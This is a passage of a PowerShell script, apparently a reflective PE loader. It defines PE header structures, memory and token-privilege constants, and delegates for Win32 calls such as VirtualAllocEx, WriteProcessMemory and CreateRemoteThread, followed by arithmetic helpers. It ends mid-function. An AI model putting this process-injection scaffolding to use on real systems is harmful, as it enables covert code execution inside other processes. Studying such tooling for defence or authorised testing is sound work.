		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
